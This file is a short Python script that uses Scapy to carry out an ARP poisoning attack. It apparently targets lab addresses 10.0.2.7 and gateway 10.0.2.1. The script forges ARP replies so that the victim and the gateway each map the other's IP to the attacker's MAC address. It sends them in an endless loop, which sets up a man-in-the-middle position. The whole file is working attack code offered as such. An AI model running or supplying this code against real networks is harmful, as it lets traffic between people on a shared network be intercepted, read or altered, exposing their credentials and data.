from scapy.all import *
import subprocess
import time

dest_ip = "10.0.2.7"
gateway_ip = "10.0.2.1"

#find MAC adress
ifconfig_result = subprocess.check_output("ifconfig eth0", shell=True).decode()
attacker_mac = re.search("ether(.*?)txqueuelen", ifconfig_result).group(1).strip()

#scapy -> ls(Ether)
eth = Ether(src=attacker_mac)

#scapy -> ls(ARP)
# it behaves like a packet coming from the gateway but it contains the packet
# of the attack machine. 
dest_arp = ARP(hwsrc=attacker_mac, psrc=gateway_ip, pdst= dest_ip)

gateway_arp = ARP(hwsrc=attacker_mac, psrc=dest_ip, pdst= gateway_ip)

dest_packet = eth / dest_arp
gateway_packet = eth / gateway_arp

print("Arp poising attack is Starting...")
while True:
	try:
		sendp(dest_packet)
		sendp(gateway_packet)
		time.sleep(1)
	except KeyboardInterrupt:
		print("Arp poising stopped")
		break
	
